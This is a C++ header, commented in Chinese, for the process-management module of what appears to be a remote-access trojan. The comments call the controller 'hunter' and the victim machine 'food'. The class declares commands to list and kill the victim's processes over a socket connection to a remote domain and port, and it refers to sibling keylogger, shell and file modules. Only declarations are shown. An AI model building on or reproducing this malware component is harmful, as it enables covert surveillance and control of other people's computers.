// 进程管理模块的实现
// 依旧采取单例模式

#pragma once
#include "TcpSocket.h"
#include "ToolHelp.h"
#include <string>
#include <map>
#include <vector>
#include <strsafe.h>
#include <winternl.h>

class Proc
{
public:
	Proc();

	// ------------------------------定义进程管理命令--------------------------------
	// hunter发送至食物
	std::string CmdFreshProcs;           // 刷新进程列表
	std::string CmdKillProc;             // kill进程
	// 食物发送至hunter
	std::string CmdSendProc;             // 发送一个进程信息
	std::string CmdKillProcSuccess;      // kill进程成功
	std::string CmdKillProcFailed;       // kill进程失败
	// 分割与结束符
	std::string CmdSplit;
	std::string CmdEnd;
	// ------------------------------定义进程管理命令(完)--------------------------------

	// 此类入口函数 跟Keybd和shell还有File模块形式差不多
	static void startByNewThread(std::string domain, int port);
	static DWORD WINAPI procThreadProc(LPVOID args);
	static void startProc(std::string domain, int port);

	// 命令解析和执行
	static void addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size);
	static std::map<std::string, std::string> parseArgs(std::string& data);
	static void processCmd(TcpSocket* sock, std::string& cmd, std::string& data);

	// 在进程管理主线程直接处理命令的函数
	static void doFreshProcs(TcpSocket* sock);
	static void doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args);

	// 辅助函数
	static BOOL GetProcessOwner(HANDLE hProcess, LPTSTR szOwner, size_t cchSize); // 获取进程所有者
	static BOOL GetProcessOwner(DWORD PID, LPTSTR szOwner, DWORD cchSize);
};

